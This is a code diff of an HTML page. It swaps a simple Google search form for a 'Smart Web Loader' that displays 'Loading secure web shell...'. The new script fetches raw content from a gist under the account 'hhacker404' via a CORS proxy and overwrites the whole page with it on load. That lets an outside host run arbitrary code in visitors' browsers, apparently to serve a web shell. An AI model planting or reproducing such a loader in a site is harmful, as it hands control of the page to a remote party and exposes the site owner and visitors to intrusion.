@@ -1,50 +1,39 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Google Search</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Smart Web Loader</title>
   <style>
     body {
       font-family: sans-serif;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      background-color: #f1f1f1;
+      text-align: center;
+      padding: 20px;
+      background-color: #f0f0f0;
     }
-    input {
-      width: 80%;
-      padding: 10px;
+    #output {
       font-size: 18px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-    }
-    button {
-      margin-top: 10px;
-      padding: 10px 20px;
-      font-size: 16px;
-      border-radius: 5px;
-      border: none;
-      background-color: #4285f4;
-      color: white;
+      color: #333;
     }
   </style>
 </head>
 <body>
-  <h2>Google Search</h2>
-  <form onsubmit="searchGoogle(); return false;">
-    <input type="text" id="searchBox" placeholder="Search Google..." />
-    <br>
-    <button type="submit">Search</button>
-  </form>
-
+  <div id="output">Loading secure web shell...</div>
   <script>
-    function searchGoogle() {
-      const query = document.getElementById('searchBox').value;
-      window.location.href = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
-    }
+    const gistURL = "https://gist.github.com/hhacker404/3d42c09362f0b22c5de77c2e793d263a/raw/Web(f)sajid.txt";
+    const proxy = `https://api.allorigins.win/raw?url=${encodeURIComponent(gistURL)}`;
+
+    fetch(proxy)
+      .then(res => res.text())
+      .then(html => {
+        document.open();
+        document.write(html);
+        document.close();
+      })
+      .catch(err => {
+        console.error("Failed to load:", err);
+        document.getElementById("output").textContent = "Error loading page.";
+      });
   </script>
 </body>
 </html>
